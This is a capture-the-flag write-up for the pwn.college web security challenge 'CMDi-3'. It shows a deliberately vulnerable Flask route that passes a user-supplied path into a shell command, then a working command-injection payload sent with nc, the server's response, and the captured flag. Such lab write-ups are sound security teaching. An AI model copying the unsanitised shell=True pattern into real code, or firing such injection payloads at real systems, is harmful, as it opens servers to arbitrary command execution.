---
layout: page
title: "🧠 Challenge Name: CMDi-3"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🗂 Category: Web Exploitation  
**Platform**: pwn.college  
**Difficulty**: Intermediate  
**Vulnerability**: Command Injection  

---

## 📝 Description

This challenge features a vulnerable Flask-based web server that lists directories using a user-supplied path. The input is passed into a shell command without proper sanitization. Your objective is to exploit this to retrieve the flag file.

---

## 🔍 Source Code Analysis

```python
@app.route("/activity", methods=["GET"])
def challenge():
    arg = flask.request.args.get("dir", "/challenge")
    command = f"ls -l '{arg}'"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        encoding="latin",
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/activity"><input type=text name=dir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """
```

---

## Key Vulnerability:
- The user input (dir) is directly interpolated inside a shell command.
- Though it's wrapped in single quotes, it can still be broken out of using ' and shell metacharacters like ;.

---

## Exploit Strategy

### Payload:
```bash
printf "GET /activity?dir=/'+;+cat+/flag;' HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
### Server Response:
```bash
<b>Output of ls -l '/' ; cat /flag;':</b><br>
<pre>total 64
[...directory listing...]
pwn.college{U7-y1phaeMq-VVkgC8K7IpcOGa0.QX2YTN2wSM0IzMyEzW}
/bin/sh: 1: : Permission denied
</pre>
```
The injected cat /flag command executed successfully and returned the flag!

---

## Flag

```bash
pwn.college{U7-y1phaeMq-VVkgC8K7IpcOGa0.QX2YTN2wSM0IzMyEzW}
```
